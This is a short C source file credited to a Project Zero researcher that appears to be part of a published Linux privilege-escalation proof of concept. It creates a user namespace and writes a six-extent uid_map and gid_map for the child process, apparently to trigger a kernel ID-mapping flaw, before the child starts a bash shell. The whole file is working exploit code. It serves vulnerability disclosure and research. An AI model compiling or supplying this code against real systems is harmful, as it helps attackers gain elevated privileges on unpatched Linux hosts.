// subshell.c
// author: Jann Horn
// source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712

#define _GNU_SOURCE
#include <unistd.h>
#include <grp.h>
#include <err.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sched.h>
#include <sys/wait.h>

int main() {
  int sync_pipe[2];
  char dummy;
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sync_pipe)) err(1, "pipe");

  pid_t child = fork();
  if (child == -1) err(1, "fork");
  if (child == 0) {
    close(sync_pipe[1]);
    if (unshare(CLONE_NEWUSER)) err(1, "unshare userns");
    if (write(sync_pipe[0], "X", 1) != 1) err(1, "write to sock");

    if (read(sync_pipe[0], &dummy, 1) != 1) err(1, "read from sock");
    execl("/bin/bash", "bash", NULL);
    err(1, "exec");
  }

  close(sync_pipe[0]);
  if (read(sync_pipe[1], &dummy, 1) != 1) err(1, "read from sock");
  char pbuf[100];
  sprintf(pbuf, "/proc/%d", (int)child);
  if (chdir(pbuf)) err(1, "chdir");
  const char *id_mapping = "0 0 1\n1 1 1\n2 2 1\n3 3 1\n4 4 1\n5 5 995\n";
  int uid_map = open("uid_map", O_WRONLY);
  if (uid_map == -1) err(1, "open uid map");
  if (write(uid_map, id_mapping, strlen(id_mapping)) != strlen(id_mapping)) err(1, "write uid map");
  close(uid_map);
  int gid_map = open("gid_map", O_WRONLY);
  if (gid_map == -1) err(1, "open gid map");
  if (write(gid_map, id_mapping, strlen(id_mapping)) != strlen(id_mapping)) err(1, "write gid map");
  close(gid_map);
  if (write(sync_pipe[1], "X", 1) != 1) err(1, "write to sock");

  int status;
  if (wait(&status) != child) err(1, "wait");
  return 0;
}
